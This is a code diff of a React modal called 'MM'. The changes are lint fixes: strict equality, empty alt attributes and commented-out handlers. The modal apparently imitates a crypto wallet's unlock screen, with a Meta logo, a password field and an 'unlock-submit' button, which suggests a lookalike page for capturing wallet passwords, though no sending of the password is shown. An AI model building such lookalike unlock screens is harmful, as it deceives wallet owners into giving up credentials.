@@ -44,7 +44,8 @@ function getCaretCoordinates(element, position) {
 }
 const MM = ({ isOpen, setIsOpen }) => {
   const inputRef = useRef(null);
-  const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
+  // const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
+  const animationEventEmitter = new EventEmitter();
   const [loading, setLoading] = useState(true);
   const [pwd, setPwd] = useState("");
   const [validShow, setValidShow] = useState(false);
@@ -69,9 +70,9 @@ const MM = ({ isOpen, setIsOpen }) => {
     },
   };
 
-  const handleOpenModal = () => {
-    setIsOpen(true);
-  };
+  // const handleOpenModal = () => {
+  //   setIsOpen(true);
+  // };
 
   const handleCloseModal = () => {
     setIsOpen(false);
@@ -99,7 +100,7 @@ const MM = ({ isOpen, setIsOpen }) => {
   };
 
   const handleKeyUp = (e) => {
-    if (e.keyCode == 13) {
+    if (e.keyCode === 13) {
       handleClick();
     }
   };
@@ -154,9 +155,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                   alignSelf: "center",
                   margin: "15rem 0 0 0",
                 }}
+                alt= {""}
                 src={meta_logo}
               ></img>
               <img
+                alt= {""}
                 src={spinner}
                 style={{
                   width: "3rem",
@@ -202,6 +205,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                         style={{ marginRight: "1rem" }}
                       >
                         <img
+                          alt= {""}
                           src={arrowDown}
                           style={{
                             width: "100%",
@@ -218,6 +222,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     style={{ marginRight: "8px" }}
                   >
                     <img
+                      alt= {""}
                       style={{
                         alignSelf: "center",
                         width: "100%",
@@ -255,8 +260,8 @@ const MM = ({ isOpen, setIsOpen }) => {
                         <div
                           className={
                             "MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl" +
-                            (validShow == true ? " Mui-error" : "") +
-                            (pwdFocus == true ? " Mui-focused" : "")
+                            (validShow === true ? " Mui-error" : "") +
+                            (pwdFocus === true ? " Mui-focused" : "")
                           }
                         >
                           <input
@@ -303,10 +308,10 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <button
                       className={
                         "button btn--rounded btn-default" +
-                        (pwd.length == 0 ? " unlock-btn-disabled" : "")
+                        (pwd.length === 0 ? " unlock-btn-disabled" : "")
                       }
                       data-testid="unlock-submit"
-                      disabled={pwd.length == 0}
+                      disabled={pwd.length === 0}
                       type="button"
                       variant="contained"
                       style={{
